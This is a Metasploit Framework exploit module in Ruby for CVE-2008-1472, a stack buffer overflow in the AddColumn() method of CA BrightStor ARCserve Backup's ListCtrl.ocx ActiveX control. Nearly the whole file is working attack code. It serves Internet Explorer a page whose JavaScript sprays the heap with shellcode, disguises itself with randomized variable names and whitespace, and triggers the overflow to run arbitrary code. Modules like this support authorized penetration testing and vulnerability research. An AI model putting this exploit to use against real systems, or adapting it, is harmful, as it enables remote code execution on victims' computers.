##
# $Id: ca_brightstor_addcolumn.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve Backup AddColumn() ActiveX Buffer Overflow',
			'Description'    => %q{
					The CA BrightStor ARCserve Backup ActiveX control (ListCtrl.ocx) is vulnerable to a stack-based
				buffer overflow. By passing an overly long argument to the AddColumn() method, a remote attacker
				could overflow a buffer and execute arbitrary code on the system.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dean <dean [at] zerodaysolutions [dot] com>' ],
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2008-1472' ],
					[ 'OSVDB', '43214' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2-SP3 IE 6.0/7.0', { 'Ret' => 0x0A0A0A0A } ]
				],
			'DisclosureDate' => 'Mar 16 2008',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Set the return.
		ret     = Rex::Text.to_unescape([target.ret].pack('V'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(30) + 1)
		var_i  = rand_text_alpha(rand(5) + 1)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)

		content = %Q|
		<html>
		<object id="#{vname}" classid="clsid:BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3"></object>
			<script>

			var #{rand1} = unescape("#{shellcode}");
			var #{rand2} = 0x0A0A0A0A;
			var #{rand3} = 0x400000;
			var #{rand4} = (#{rand2} - #{rand3}) / #{rand3};
			var #{rand5} = unescape("#{ret}");
			var #{rand6} = 128;

			while((#{rand5}.length * 2) < #{rand3}) #{rand5} += #{rand5};
				#{rand5} = #{rand5}.substring(0, #{rand3} - #{rand1}.length);
				#{rand7} = new Array();
				for(#{var_i} = 0; #{var_i} < #{rand4}; #{var_i}++) #{rand7}[#{var_i}] = #{rand5} + #{rand1};
					while(#{rand5}.length < (#{rand6} * 2)) #{rand5} += #{rand5};
						#{rand5} = #{rand5}.substring(0, #{rand6});

						#{vname}.AddColumn(#{rand5}, 1);
			</script>
		</html>
			|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
